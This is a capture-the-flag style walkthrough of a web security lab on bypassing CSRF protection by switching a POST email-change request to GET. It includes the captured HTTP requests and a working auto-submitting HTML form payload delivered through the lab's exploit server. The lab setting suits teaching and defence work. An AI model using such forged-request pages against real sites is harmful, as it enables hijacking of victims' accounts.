## CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Notes

- Possibility to leave a comment on a post
- Exploit server
- /login

## Resume

1. Login with `wiener`
2. Update email address
3. Send request to Repeater
4. Test CSRF protection
5. Convert the request from `POST` to `GET`
6. Generate a CSRF PoC
7. Deliver the exploit using the Exploit Server

## Solve

Login with the following credentials:

```text
wiener:peter
```

Update the email address once and capture the request in Burp Suite.

Original request:

```http
POST /my-account/change-email HTTP/2
Host: 0ad200d403fad074804c994000ef0033.web-security-academy.net
Cookie: session=KAvm6S10QVraDgJwco5Mrj6kY47NkDwG
Content-Length: 59
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0ad200d403fad074804c994000ef0033.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad200d403fad074804c994000ef0033.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=toto%40toto.com&csrf=2aUqzO1K2w6nqyVMka3VJGrq8ZykXizr
```

Send the request to **Burp Repeater**.

If you modify the `csrf` parameter, the request is rejected. This confirms that CSRF protection exists for the `POST` request.

Now right-click the request and select:

```text
Change request method
```

The request becomes:

```http
GET /my-account/change-email?email=toto%40toto.com&csrf=2aUqzO1K2w6nqyVMka3VJGrq8ZykXizr HTTP/2
Host: 0ad200d403fad074804c994000ef0033.web-security-academy.net
Cookie: session=KAvm6S10QVraDgJwco5Mrj6kY47NkDwG
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0ad200d403fad074804c994000ef0033.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad200d403fad074804c994000ef0033.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

The application now accepts the request even if the CSRF token is invalid or removed.

This means the CSRF protection is only enforced for `POST` requests and can be bypassed by changing the method to `GET`.

Generate a CSRF PoC using Burp Suite or use the following payload:

```html
<html>
  <body>
    <form action="https://0ad200d403fad074804c994000ef0033.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="hacker@lab.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Upload the payload to the **Exploit Server**, then click:

```text
Store
```

Finally, click:

```text
Deliver exploit to victim
```

The victim automatically sends a forged `GET` request that changes their email address, solving the lab.